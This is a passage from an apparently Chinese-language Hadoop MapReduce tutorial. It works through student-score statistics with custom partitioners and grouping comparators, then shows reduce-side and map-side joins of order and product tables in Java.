求学生成绩题目1234567891011121314151617181920212223242526272829303132computer,huangxiaoming,85,86,41,75,93,42,85computer,xuzheng,54,52,86,91,42computer,huangbo,85,42,96,38english,zhaobenshan,54,52,86,91,42,85,75english,liuyifei,85,41,75,21,85,96,14algorithm,liuyifei,75,85,62,48,54,96,15computer,huangjiaju,85,75,86,85,85english,liuyifei,76,95,86,74,68,74,48english,huangdatou,48,58,67,86,15,33,85algorithm,huanglei,76,95,86,74,68,74,48algorithm,huangjiaju,85,75,86,85,85,74,86computer,huangdatou,48,58,67,86,15,33,85english,zhouqi,85,86,41,75,93,42,85,75,55,47,22english,huangbo,85,42,96,38,55,47,22algorithm,liutao,85,75,85,99,66computer,huangzitao,85,86,41,75,93,42,85math,wangbaoqiang,85,86,41,75,93,42,85computer,liujialing,85,41,75,21,85,96,14,74,86computer,liuyifei,75,85,62,48,54,96,15computer,liutao,85,75,85,99,66,88,75,91computer,huanglei,76,95,86,74,68,74,48english,liujialing,75,85,62,48,54,96,15math,huanglei,76,95,86,74,68,74,48math,huangjiaju,85,75,86,85,85,74,86math,liutao,48,58,67,86,15,33,85english,huanglei,85,75,85,99,66,88,75,91math,xuzheng,54,52,86,91,42,85,75math,huangxiaoming,85,75,85,99,66,88,75,91math,liujialing,85,86,41,75,93,42,85,75english,huangxiaoming,85,86,41,75,93,42,85algorithm,huangdatou,48,58,67,86,15,33,85algorithm,huangzitao,85,86,41,75,93,42,85,75 一、数据解释 数据字段个数不固定：第一个是课程名称，总共四个课程，computer，math，english，algorithm，第二个是学生姓名，后面是每次考试的分数 二、统计需求：1、统计每门课程的参加考试人数和课程平均分 2、统计每门课程参考学生的平均分，并且按课程存入不同的结果文件，要求一门课程一个结果文件 3、求出每门课程参考学生成绩最高平均分的学生的信息：课程，姓名和平均分 答案第1小题统计每门课程的参考人数和课程平均分 涉及知识点: 去重， 自定义类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177//  ScoreBean package com.rox.mapreduce.mr3._02_分组组件;import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.WritableComparable;import lombok.AllArgsConstructor;import lombok.Getter;import lombok.NoArgsConstructor;import lombok.Setter;@Getter@Setter@AllArgsConstructor@NoArgsConstructorpublic class ScoreBean implements WritableComparable&lt;ScoreBean&gt; &#123; private String courseName; private String stuName; private Double score; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(courseName); out.writeUTF(stuName); out.writeDouble(score); &#125; @Override public void readFields(DataInput in) throws IOException &#123; this.courseName = in.readUTF(); this.stuName = in.readUTF(); this.score = in.readDouble(); &#125; @Override /** * 如果是相同课程, 按照分数降序排列的 * 如果是不同课程, 按照课程名称升序排列 */ public int compareTo(ScoreBean o) &#123; // 测试一下只写按分数降序排序// return o.getScore().compareTo(this.getScore()); /*// 首先分组(只在相同的组内进行比较) int nameRes = this.getCourseName().compareTo(o.getCourseName()); if (nameRes == 0) &#123; // 课程相同的时候才进行降序排序 int scoreRes = return scoreRes; &#125; return nameRes;*/ return 0; &#125; public String toString1() &#123; return stuName + "\t" + score; &#125; @Override public String toString() &#123; return courseName + "\t" + stuName + "\t" + score; &#125; public ScoreBean(String stuName, Double score) &#123; super(); this.stuName = stuName; this.score = score; &#125;&#125;//  ScorePlusDemo1 package com.rox.mapreduce.mr3._02_分组组件;import java.io.IOException;import java.util.HashSet;import java.util.Set;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ScorePlusDemo1 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf); job.setJarByClass(ScorePlusDemo1.class); job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(ScoreBean.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(Text.class); String inP = "/in/newScoreIn"; String outP = "/out/ans1"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; Boolean waitForComp = job.waitForCompletion(true); System.exit(waitForComp?0:1); &#125; static class MyMapper extends Mapper&lt;LongWritable, Text, Text, ScoreBean&gt; &#123; Text k = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; // 1.截取 String[] datas = value.toString().trim().split(","); String courseName = datas[0].trim(); String stuName = datas[1].trim(); int sum = 0; for (int i=2; i&lt;datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avgScore = sum/(datas.length-2); ScoreBean sb = new ScoreBean(courseName, stuName, avgScore); k.set(courseName); context.write(k, sb); &#125; &#125; static class MyReducer extends Reducer&lt;Text, ScoreBean, Text, Text&gt; &#123; Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;ScoreBean&gt; values, Reducer&lt;Text, ScoreBean, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; Set&lt;String&gt; stuNames = new HashSet&lt;&gt;(); int count = 0; int sum = 0; for (ScoreBean sb : values) &#123; stuNames.add(sb.getStuName()); count ++; sum += sb.getScore(); &#125; int size = stuNames.size(); String val = size + "\t" + (double)sum/count; v.set(val); context.write(key, v); &#125; &#125;&#125;// 执行结果 algorithm 6 71.33333333333333computer 10 69.6english 8 66.0math 7 72.57142857142857 第2小题统计每门课程参考学生的平均分，并且按课程存入不同的结果文件，要求一门课程一个结果文件 涉及知识点： 分区, 字符串组合key， Partitioner 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207package com.rox.mapreduce.mr3._02_分组组件;import java.io.IOException;import java.util.HashMap;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Partitioner;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;/** * @author shixuanji * 注意: 此题因为数据中有2条 course 和 stuName相同的数据(english liuyifei), 所以必须再在reduce中继续去重一下, 再计算一下平均分 * * 否则, 可以不用写reduce, 因为Mapper中已经把逻辑处理完了,可以直接输出 * 最终输出: * computer liuyifei 43 * computer huanglei 63 * math liutao 64 * ... */public class ScorePlusDemo2 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException &#123; // 指定HDFS相关参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); //  创建/配置 Job Job job = Job.getInstance(conf); // 设置Jar包类型 job.setJarByClass(ScorePlusDemo2.class); // 设置Map Reduce执行类 job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); // 设置Map输出类 job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(DoubleWritable.class); // Reduce输出类 job.setOutputKeyClass(Text.class); job.setOutputValueClass(DoubleWritable.class); //  设置分区  job.setPartitionerClass(MyPartition.class); job.setNumReduceTasks(4); // 设置输入 输出路径 String inP = "/in/newScoreIn"; String outP = "/out/scorePlus2"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // 设置如果存在路径就删除 Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; //  执行job boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:-1); &#125; =============================================================== static class MyMapper extends Mapper&lt;LongWritable, Text, Text, DoubleWritable&gt; &#123; // 把 课程+学生 作为 key Text k = new Text(); //只有输出String类型的, 才需要在这里设置Text DoubleWritable v = new DoubleWritable(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String[] datas = value.toString().trim().split(","); String kStr = datas[0].trim() + "\t" + datas[1].trim(); int sum = 0; for (int i = 2; i &lt; datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avg = sum / (datas.length - 2); k.set(kStr); v.set(avg); context.write(k, v); &#125; &#125;=============================================================== /** * @author shixuanji * 注意: 此题因为数据中有2条 course 和 stuName相同的数据, 所以必须再在reduce中 * 继续去重一下, 再计算一下平均分 * * 否则, 可以不用写reduce, 因为Mapper中已经把逻辑处理完了,可以直接输出 */ static class MyReducer extends Reducer&lt;Text, DoubleWritable, Text, DoubleWritable&gt; &#123; DoubleWritable v = new DoubleWritable(); @Override protected void reduce(Text key, Iterable&lt;DoubleWritable&gt; values, Reducer&lt;Text, DoubleWritable, Text, DoubleWritable&gt;.Context context) throws IOException, InterruptedException &#123; /** * 考虑到有 课程, 学生名相同, 后面的数据不同的情况, 这里再做一个平均求和 * 可以验证打印下 */ int count = 0; Double sum = 0.0; for (DoubleWritable avg : values) &#123; if (count &gt; 0) &#123; // 有key完全相同的情况才会进到这里 System.out.println("这是第" +count +"次, 说明课程和姓名有相同的两条数据\n课程姓名是: "+key.toString()); &#125; sum += avg.get(); count ++; &#125; Double finAvg = sum/count; v.set(finAvg); context.write(key, v); &#125; &#125;&#125;==============================================================================================================================/** * @author shixuanji * 继承 Partitioner, 实现自定义分区 */class MyPartition extends Partitioner&lt;Text, DoubleWritable&gt; &#123; private static HashMap&lt;String, Integer&gt; courseMap = new HashMap&lt;&gt;(); static &#123; courseMap.put("algorithm", 0); courseMap.put("computer", 1); courseMap.put("english", 2); courseMap.put("math", 3); &#125; @Override public int getPartition(Text key, DoubleWritable value, int numPartitions) &#123; // 取出Map输出的key中的前半部分--courseName Integer code = courseMap.get(key.toString().trim().split("\t")[0]); if (code != null) &#123; return code; &#125; return 5; &#125;&#125;=============================================================== ===============================================================  执行结果 algorithm huangdatou 56.0algorithm huangjiaju 82.0algorithm huanglei 74.0algorithm huangzitao 72.0algorithm liutao 82.0algorithm liuyifei 62.0----------computer huangbo 65.0computer huangdatou 56.0computer huangjiaju 83.0computer huanglei 74.0computer huangxiaoming 72.0computer huangzitao 72.0computer liujialing 64.0computer liutao 83.0computer liuyifei 62.0computer xuzheng 65.0---------english huangbo 55.0english huangdatou 56.0english huanglei 83.0english huangxiaoming 72.0english liujialing 62.0english liuyifei 66.5english zhaobenshan 69.0english zhouqi 64.0------------math huangjiaju 82.0math huanglei 74.0math huangxiaoming 83.0math liujialing 72.0math liutao 56.0math wangbaoqiang 72.0math xuzheng 69.0 第3小题求出 每门课程①参与考试的学生成绩 最高平局分② 的学生的信息：课程，姓名和平均分 解题思路： 通过题意得出2个结论 课程要分组 平均分要排序 排序的话，交给key来做无疑是最好的，因为MapReduce会自动对key进行分组&amp;排序 因此可以把 课程&amp;平均分 作为一个联合key 为了操作方便，可以封装到一个对象中去： ScoreBean 分组和排序需要在 ScoreBean重写的compareTo()方法中完成 因为最后结果是求每门课程的最高平均分，因此需要对课程进行分组。 此时原本的默认分组（以Bean对象整体分组）就不管用了，需要自定义分组 自定义分组要继承WritableComparator，重写compare()方法，指定分组的规则。 ScoreBean先按照组别进行排序，到reduce中时，已经是按照组，排好的数据，MyGroup 会把相同的比较结果放到同一个组中，分发到reduce. reduce中，只需要取出每组的第一个元素输出到上下文即可 图示 涉及知识点： mr中key的作用，自定义对象的用法，自定义分组，mr的执行流程 利用“班级和平均分”作为 key，可以将 map 阶段读取到的所有学生成绩数据按照班级 和成绩排倒序，发送到 reduce 在 reduce 端利用 GroupingComparator 将班级相同的 kv 聚合成组，然后取第一个即是最 大值 先贴个结论：执行流程结论 map每读一行就 write 到 context 一次，按照指定的key进行分发 map 把所有的数据都读完了之后，大概执行到67%的时候，开始进入 CustomBean，执行CustomBean的compareTo()方法，会按照自己写的规则一条一条数据比较 上述都比较完毕之后，map阶段就结束了，此时来到了 reduce阶段，但是是到了67%了 到了reduce阶段，直接进入了MyGroup中自定义的compare方法。 MyGroup的compare()方法，如果返回非0， 就会进入 reduce 方法写出到context MyGroup进入Reduce的条件是 MyReduce中，如果compare的结果不等于0，也就是比较的2者不相同， 此时就进入Reduce， 写出到上下文 如果相同，会一直往下读，直到读到不同的， 此时写出读到上下文。 因为MyGroup会在Reduce阶段执行，而CustomBean中的compareTo()是在map阶段执行，所以需要在CustomBean中就把组排好序，此时分组功能才能正常运作 指定分组类MyGroup和不指定的区别 指定与不指定是指：在Driver类中，是否加上job.setGroupingComparatorClass(MyGrouper.class);这一句。 指定分组类： 会按照分组类中，自定义的compare()方法比较，相同的为一组，分完一组就进入一次reduce方法 不指定分组类：（目前存疑） 是否是按照key进行分组 如果是自定义类为key，是否是按照此key中值相同的分为一组 如果是hadoop内置类，是否是按照此类的值分组（Text-String的值，IntWritable-int值等..） 依然是走得以上这套分组逻辑，一组的数据读完才进入到Reduce阶段做归并 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231// ScoreBean2 package com.rox.mapreduce.mr3._02_分组组件;import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.WritableComparable;import lombok.Getter;import lombok.Setter;@Getter@Setterpublic class ScoreBean2 implements WritableComparable&lt;ScoreBean2&gt; &#123; private String courseName; private Double score; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(courseName); out.writeDouble(score); &#125; @Override public void readFields(DataInput in) throws IOException &#123; this.courseName = in.readUTF(); this.score = in.readDouble(); &#125; @Override /** * 如果是相同课程, 按照分数降序排列的 * 如果是不同课程, 按照课程名称升序排列 */ public int compareTo(ScoreBean2 o) &#123; // 测试一下只写按分数降序排序// return o.getScore().compareTo(this.getScore()); // 首先分组(只在相同的组内进行比较) int nameRes = this.getCourseName().compareTo(o.getCourseName()); if (nameRes == 0) &#123; // 课程相同的时候才进行降序排序 int scoreRes = o.getScore().compareTo(this.getScore()); return scoreRes; &#125; return nameRes; &#125; /** * 实际上ScoreBean中是包含所有的参数的, 这里的输出可以自己设置 */ @Override public String toString() &#123; return courseName + "\t" + score; &#125; public ScoreBean2(String courseName, Double score) &#123; super(); this.courseName = courseName; this.score = score; &#125; public ScoreBean2() &#123; super(); &#125;&#125;// ScorePlusDemo3 package com.rox.mapreduce.mr3._02_分组组件;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.io.WritableComparable;import org.apache.hadoop.io.WritableComparator;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ScorePlusDemo3 &#123;  main  public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf); job.setJarByClass(ScorePlusDemo3.class); job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); job.setMapOutputKeyClass(ScoreBean2.class); job.setMapOutputValueClass(Text.class); job.setGroupingComparatorClass(MyGrouper.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); String outP = "/out/scorePlus3"; FileInputFormat.setInputPaths(job, new Path("/in/newScoreIn")); FileOutputFormat.setOutputPath(job, new Path(outP)); // 如果输出目录存在,就先删除 Path myPath = new Path(outP); FileSystem fs = myPath.getFileSystem(conf); if (fs.isDirectory(myPath)) &#123; fs.delete(myPath, true); &#125; boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion ? 0 : -1); &#125; Mapper  /** * @author shixuanji * 输出: key: course * value: score ... * 思路: * 1.不同课程要分开展示, 以 课程+分数 作为key, 在mapper中完成排序 * 2.在reduce中按照 MyGrouper 完成分组 */ static public class MyMapper extends Mapper&lt;LongWritable, Text, ScoreBean2, Text&gt; &#123; private String[] datas; Text v = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; datas = value.toString().trim().split(","); int sum = 0; for (int i = 2; i &lt; datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avg = (double) sum / (datas.length - 2); ScoreBean2 sb = new ScoreBean2(datas[0].trim(), avg); v.set(datas[1].trim()); context.write(sb, v); &#125; &#125; Redecer  static public class MyReducer extends Reducer&lt;ScoreBean2, Text, Text, NullWritable&gt; &#123; Text k = new Text(); int count = 1; @Override protected void reduce(ScoreBean2 key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123; /** * 如果没有其它问题 * 此时是按照课程分好组了, 同一个课程的所有学生都过来了, 并且学生成绩是排好的, * 如果此时求最大值, 只需要取出第一个即可 */ // 进来一次只取第一个 Text name = values.iterator().next(); k.set(key.getCourseName() + "\t" + name.toString() + "\t" + key.getScore()); context.write(k, NullWritable.get()); context.write(new Text("==================第"+count+"次进入reduce"), NullWritable.get()); /*context.write(new Text("==================第"+count+"次进入reduce"), NullWritable.get()); for (Text name : values) &#123; k.set(key.getCourseName() + "\t" + name.toString() + "\t" + key.getScore()); context.write(k, NullWritable.get()); context.write(new Text("---------in for write------"), NullWritable.get()); &#125;*/ count++; &#125; &#125;&#125; MyGrouper /** * @author shixuanji * 自定义分组 需要继承一个类WritableComparator * 重写compare方法 */class MyGrouper extends WritableComparator &#123; // WritableComparator 此方法的默认无参构造是不会创建对象的, 需要自己重写 public MyGrouper() &#123; // 中间省去的参数是 Configuration, 如果为空, 会创建一个新的 super(ScoreBean2.class, true); &#125; /** * 此处比较的是2个 WritableComparable 对象, 需要强转一下具体的类对象 */ @SuppressWarnings("rawtypes") @Override public int compare(WritableComparable a, WritableComparable b) &#123; ScoreBean2 aBean = (ScoreBean2) a; ScoreBean2 bBean = (ScoreBean2) b; // 返回分组规则 System.out.println(aBean.getCourseName()+"---MyGroup中比较---"+(bBean.getCourseName())); return aBean.getCourseName().compareTo(bBean.getCourseName()); &#125;&#125;================================================================================ 执行结果 ================================================================================algorithm huangjiaju 82.28571428571429==================第1次进入reducecomputer huangjiaju 83.2==================第2次进入reduceenglish huanglei 83.0==================第3次进入reducemath huangxiaoming 83.0==================第4次进入reduce MR实现两个表的数据关联Join题目 订单数据表t_order： flag=0id date pid amount1001 20150710 P0001 21002 20150710 P0001 31003 20150710 P0002 3Id:数据记录idDate 日期Pid 商品idAmount 库存数量 6.商品信息表t_product flag=1pid name category_id priceP0001 小米5 C01 2000P0002 锤子T1 C01 3500 mr实现两个表的数据关联id pid date amount name category_id price 答案1 : Reducer 端 实现 Join思路 map端 读取到当前路径下，所有文件的切片信息， 根据文件名判断是那张表 在setup中，从文件切片中获取到文件名 123456// 获取读取到的切片相关信息,一个切片对应一个 maptaskInputSplit inputSplit = context.getInputSplit();// 转换为文件切片FileSplit fs = (FileSplit)inputSplit;// 获取文件名filename = fs.getPath().getName(); 这里总共会获得2个文件名（指定目录存了2个指定文件），一个文件名对应一个切片 关联字段作为key， 其它的作为value，在value前面加上当前文件的名称标记 reduce端 通过标记区分两张表，把读取到的信息，分别存入2个list中 遍历大的表，与小表进行拼接（小表的相同pid记录只会有一条） 拼接完成后即可写出 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161package com.rox.mapreduce.mr3._03_join2表的数据关联;import java.io.IOException;import java.util.ArrayList;import java.util.List;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ReduceJoinDemo &#123; public static void main(String[] args) throws Exception &#123; // 指定HDFS相关参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); //  创建/配置 Job Job job = Job.getInstance(conf); // 设置Jar包类型 job.setJarByClass(ReduceJoinDemo.class); // 设置Map Reduce执行类 job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); // 设置Map输出类 job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(Text.class); // Reduce输出类 job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); // 设置输入 输出路径 String inP = "/in/joindemo"; String outP = "/out/joinout1"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // 设置如果存在路径就删除 Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; //  执行job boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:-1); &#125; /** * @author shixuanji * 思路: 读取2个表中的数据,进行标记发送 * key: 两表需要关联的字段 * value: 其它值, 需要标记， 标记数据的来源 * * * **核心： 关联条件** - 想要在 reduce 端完成 join， 要在 reduce 端可以同时接收到两个表中的数据 - 要保证在 Map 端进行读文件的时候， 读到2个表的数据， 并且需要对2个表的数据进行区分 - 将2个表放在同一个目录下 解决: mapper 开始执行时, 在setup方法中, 从上下文中取到文件名, 根据文件名打标记 */ static class MyMapper extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String filename = ""; Text k = new Text(); Text v = new Text(); @Override protected void setup( Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // 获取读取到的切片相关信息,一个切片对应一个 maptask InputSplit inputSplit = context.getInputSplit(); // 转换为文件切片 FileSplit fs = (FileSplit)inputSplit; // 获取文件名 filename = fs.getPath().getName(); System.out.println("本次获取到的文件名为-----"+filename); &#125; @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // 解析出来每一行内容, 打标记, 发送 String[] infos = value.toString().split("\t"); if (filename.equals("order")) &#123; k.set(infos[2]); // 设置标记前缀为 OR v.set("OR"+infos[0]+"\t"+infos[1]+"\t"+infos[3]); &#125;else &#123; k.set(infos[0]); // 设置标记前缀为 PR v.set("PR"+infos[1]+"\t"+infos[2]+"\t"+infos[3]); &#125; context.write(k, v); &#125; &#125; static class MyReducer extends Reducer&lt;Text, Text, Text, NullWritable&gt; &#123; Text k = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, NullWritable&gt;.Context context) throws IOException, InterruptedException &#123; /** * 首先明确 product 和 order 是 一对多的关系 * 根据前缀不同,取到2个不同的表存进2个容器中 * 遍历多的表, 与一进行拼接 * 最后写出到上下文 * 最终的输出格式 id pid date amount name category_id price */ // 因为每次遍历到不同的pid, 都会走进来一次, list也会有新的输出,所以必须定义在里面,每次进来都要初始化 List&lt;String&gt; productList =new ArrayList&lt;&gt;(); List&lt;String&gt; orderList =new ArrayList&lt;&gt;(); for (Text v : values) &#123; String vStr = v.toString(); if (vStr.startsWith("OR")) &#123; orderList.add(vStr.substring(2)); &#125;else &#123; productList.add(vStr.substring(2)); &#125; &#125; // 此时2个list添加完了本次 相同的 key(pid) 的所有商品 // 遍历多的进行拼接 for (String or : orderList) &#123; // 相同的 pid的 product 只有一个, productList中的数量是1 // 但是相同pid 的 订单 可能有多个 String res = key.toString() + "\t" + or + productList.get(0); k.set(res); context.write(k, NullWritable.get()); &#125; &#125; &#125;&#125; ※ 答案2 ： Mapper 端实现 Join ※思路 创建job的时候,把小表加入缓存 在map的setup中, 读取缓存中的数据, 存入一个成员变量 map中 map方法中,只需要读一个表, 然后根据关联条件(关联key: pid)消除笛卡尔集,进行拼接 map直接输出, 甚至都不需要reduce 注意点: 需要达成jar包运行, 直接用Eclipse会找不到缓存 jar包执行方法 12# 如果代码内部指定了输入输出路径，后面的/in，/out参数可以不加hadoop jar xxxx.jar com.rox.xxx.xxxx(主方法) /in/xx /out/xx 如果没有Reduce方法 main方法中，设置map的写出key，value,应该用 setOutputKeyClass 123//// 设置Map输出类 (因为这里没有Reduce, 所以这里是最终输出,一定要注意!!!)//////////job.setOutputKeyClass(Text.class);job.setOutputValueClass(NullWritable.class); 要设置reduce task 的个数为0 1job.setNumReduceTasks(0); 把小文件加载到缓存中的方法 12////////////// 将小文件加载到缓存 job.addCacheFile(new URI("/in/joindemo/product")); ​ 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120package com.rox.mapreduce.mr3._03_join;import java.io.BufferedReader;import java.io.FileReader;import java.io.IOException;import java.net.URI;import java.util.HashMap;import java.util.Map;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MapJoinDemo &#123; public static void main(String[] args) throws Exception &#123; // 指定HDFS相关参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); //  创建/配置 Job Job job = Job.getInstance(conf); // 设置Jar包类型:这里千万别写错了 job.setJarByClass(MapJoinDemo.class); // 设置Map Reduce执行类 job.setMapperClass(MyMapper.class); ///////////// 设置Map输出类 (因为这里没有Reduce, 所以这里是最终输出,一定要注意!!!)////////// job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); ////////////// 设置reduce执行个数为0 job.setNumReduceTasks(0); ////////////// 将小文件加载到缓存 job.addCacheFile(new URI("/in/joindemo/product")); // 设置输入 输出路径 String inP = "/in/joindemo/order"; String outP = "/out/joinout2"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // 设置如果存在路径就删除 Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; //  执行job System.exit(job.waitForCompletion(true)?0:-1); &#125; /** * @author shixuanji * 思路: * 创建job的时候,把小表加入缓存 * 在map的setup中, 读取缓存中的数据, 存入一个成员变量 map中 * map方法中,只需要读一个表, 然后根据关联条件(关联key: pid)消除笛卡尔集,进行拼接 * 直接输出, 甚至都不需要reduce * * 注意点: * 需要达成jar包运行, 直接用Eclipse会找不到缓存 * 格式: hadoop jar包本地路径 jar包主方法全限定名 hadoop输入 hadoop输出 */ static class MyMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; // 创建装载小表的map, key存储 关联键, value存其它 Map&lt;String, String&gt; proMap = new HashMap&lt;&gt;(); @Override protected void setup(Context context) throws IOException, InterruptedException &#123; // 获取缓存中存储的小表 (一般是 一对多中的 一), 因为只存了1个,所以直接取第0个 Path path = context.getLocalCacheFiles()[0]; String pString = path.toString(); // 开启in流, BufferedReader 逐行读取文件 BufferedReader br = new BufferedReader(new FileReader(pString)); String line = null; while ((line = br.readLine()) != null) &#123; // 成功读取一行 String[] infos = line.split("\t"); // 存进proMap proMap.put(infos[0], infos[1] + "\t" + infos[2] + "\t" + infos[3]); &#125;// br.close(); &#125; /** * 直接从路径读取大文件 */ Text k = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String[] infos = value.toString().split("\t"); String pid = infos[2]; //进行关联 pid到map中匹配 如果包含 证明匹配上了 // 艹, 这里pid之前加了 "", 妈的,当然找不到啦!!! if (proMap.containsKey(pid)) &#123; String res = value.toString() + "\t" + 